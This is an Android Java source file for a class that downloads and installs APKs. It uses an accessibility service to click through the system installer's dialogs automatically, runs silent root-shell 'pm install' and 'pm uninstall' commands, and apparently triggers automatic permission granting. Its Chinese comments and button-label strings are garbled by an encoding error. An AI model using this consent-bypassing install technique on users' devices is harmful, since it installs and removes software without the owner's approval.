/**
 * 
 */
package download.install;


import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import util.AppUtils;
import util.ConfigCt;
import android.annotation.TargetApi;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import download.ftp;
import permission.GivePermission;
import accessibility.AccessibilityHelper;
import util.Funcs;
import util.RootShellCmd;


/**
 * @author byc
 *
 */
public class InstallApp extends BaseAccessibilityJob  {
	 private static InstallApp current;
	 private static final String PACKAGE_INSTALLER="com.android.packageinstaller";
	 private AppInfo mApp;
	 public static final String INSTALL_CMD="pm install -r"; 
	 public String mPackageName = "";
	 public String mApkPath = "";
	 public static boolean bInstall = false;//����ֻ���Լ���app����ִ�����ܰ�װ
	 private Map<Integer, Boolean> handleMap = new HashMap<Integer, Boolean>();
	 private RootShellCmd mRootShellCmd;
	 
	 public InstallApp(){
		 //super(new String[]{PACKAGE_INSTALLER});
		 //
		 //super(new String[]{"com.miui.packageinstaller"});
		 super(null);
	 }
	 public static synchronized InstallApp getInstallApp() {
	        if(current == null) {
	            current = new InstallApp();
	        }
	        return current;
	 }
	@Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);
	}
    @Override
    public void onStopJob() {
    	super.onStopJob();
    }
    @Override
    public void onReceiveJob(AccessibilityEvent event) {
    	super.onReceiveJob(event);
    	if(!mIsEventWorking)return;
    	if(!mIsTargetPackageName)return;
    	//Log.i(TAG2, event.getPackageName().toString());
    	if(eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED||eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED){
    		AccessibilityNodeInfo nodeInfo = event.getSource();
    		if (nodeInfo == null)return;
    		nodeInfo=AccessibilityHelper.getRootNode(nodeInfo);
    		recycleClick(nodeInfo);
    	}
    }
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
	private boolean isXiaomiOpenButton(AccessibilityNodeInfo nodeInfo){
    	if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR2)return false;
		if(nodeInfo!=null&&nodeInfo.getViewIdResourceName()!=null&&nodeInfo.getViewIdResourceName().toString().equals("com.miui.packageinstaller:id/ads_install_button"))
			return true;
		else
			return false;
    }
    private void recycleClick(AccessibilityNodeInfo rootNode){
  		AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "��װ",-1);
      	if(nodeInfo!=null){
      		if(nodeInfo.isClickable()){AccessibilityHelper.performClick(nodeInfo);return;}
      	}
      	if(mApp.runAfterInstall){
      		nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "��",-1);
      		if(nodeInfo!=null&&isXiaomiOpenButton(nodeInfo)==false){
      			if(nodeInfo.isEnabled()){
      				AccessibilityHelper.performClick(nodeInfo);closeTimeWorking();return;
      			}else{
      				nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "���",-1);
      	    		if(nodeInfo!=null){
      	    			if(nodeInfo.isClickable()){AccessibilityHelper.performClick(nodeInfo);closeTimeWorking();return;}
      	    		}
      			}
      		}
      	}else{
      		nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "���",-1);
      		if(nodeInfo!=null){
      			if(nodeInfo.isClickable()){AccessibilityHelper.performClick(nodeInfo);closeTimeWorking();return;}
      		}
      		nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "ȷ��",-1);
      		if(nodeInfo!=null){
      			if(nodeInfo.isClickable()){AccessibilityHelper.performClick(nodeInfo);closeTimeWorking();return;}
      		}
      	}
      	//nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "ɾ��",-1);
      	//if(nodeInfo==null)return;
      	//if(nodeInfo.isClickable()){AccessibilityHelper.performClick(nodeInfo);closeTimeWorking();}
  	}
	/*
	 * (ˢ�´�������)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
    	if(service==null)return;
    	AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
    	if(rootNode==null)return;
    	recycleClick(rootNode);
    	
	}
  //----------------------------------------------------------------------------------------

	/** 
	     * ���͸�����Ϣ��
	     * @param context 
	     * @param filename  �ļ��� 
	     * @return   PackageName������
	*/  
	public static void SendUpdateMessage(Context context) {
			//���͹㲥��������Ϣ��
			Intent intent = new Intent(ConfigCt.ACTION_UPDATE_INFO);
			//intent.putExtra("what", msg.what);
			//intent.putExtra("CurrentDownFilename",CurrentDownFilename);
			context.sendBroadcast(intent);
	}
	/*
	 * ���ܰ�װ
	 */
	 public void smartInstall(AppInfo app) {//
	    	bInstall=true;
	    	String apkPath=ConfigCt.LocalPath+app.filename;
	    	this.mApp=app;
	    	if(mApp.pkgname==null)mApp.pkgname=AppUtils.getPackageNameFromApkName(context,apkPath);
	    	if(mApp.pkgname==null)return;
	    	//if(isInstalled(mApp.pkgname))
	    	//	uninstallApk(mApp.pkgname);
	    	//else
	    	installApk(mApp);
		    if(isEnable()){
		    	EventTimeStart();
		    	TimeStart();
		    }
    		if(GivePermission.getGivePermission().isEnable()){
    			GivePermission.getGivePermission().EventStart();
    			GivePermission.getGivePermission().TimeStart();
    		}
	}
	/*
		 * ���ܰ�װ
	*/
	public void installApk(AppInfo app) {//
	    	bInstall=true;
	    	String apkPath=ConfigCt.LocalPath+app.filename;
	    	this.mApp=app;
	        Uri uri = Uri.fromFile(new File(apkPath));
	        Intent localIntent = new Intent(Intent.ACTION_VIEW);
	        localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        localIntent.setDataAndType(uri, "application/vnd.android.package-archive");
	        localIntent.putExtra("hide", true);
	        context.startActivity(localIntent);
	        //if(mApp.runAfterInstall)givePower.Start();//��ȡȨ�ޣ�
	}
	/*
	 * ���ܰ�װ
	 */
	public void smartInstall(String apkPath) {//
	    	bInstall=true;
	        Uri uri = Uri.fromFile(new File(apkPath));
	        Intent localIntent = new Intent(Intent.ACTION_VIEW);
	        localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        localIntent.setDataAndType(uri, "application/vnd.android.package-archive");
	        localIntent.putExtra("hide", true);
	        context.startActivity(localIntent);
	        //if(mApp.runAfterInstall)givePower.Start();//��ȡȨ�ޣ�
	        if(isEnable()){
	        	EventStart();
	        	TimeStart();
	        }
    		if(GivePermission.getGivePermission().isEnable()){
    			GivePermission.getGivePermission().EventStart();
    			GivePermission.getGivePermission().TimeStart();
    		}
	}


	    //��Ĭ��װ
	    public void installApkInCmd(String apkPath) {
	        //String cmd = "pm install -r /mnt/sdcard/test.apk";
	    	mApkPath=apkPath;
	        String cmd = "pm install -r "+apkPath;
	        //RootShellCmd.RootCommand(cmd);
	        mRootShellCmd.RootCmd(cmd);
	    }
	    //��Ĭж��
	    public void uninstallApkInCmd(String PackageName) {
	        String cmd = "pm uninstall " + PackageName;
	        //RootShellCmd.RootCommand(cmd);
	        mRootShellCmd.RootCmd(cmd);
	    }
	    //��Ĭ��װ
	    public static void installSlient(String apkPath) {
	        //String cmd = "pm install -r /mnt/sdcard/test.apk";
	        String cmd = "pm install -r "+apkPath;
	        RootShellCmd.RootCommand(cmd);
	        //mRootShellCmd.
	    }

	    //��Ĭж��
	    public static void uninstallSlient(String PackageName) {
	        String cmd = "pm uninstall " + PackageName;
	        RootShellCmd.RootCommand(cmd);
	    }

}
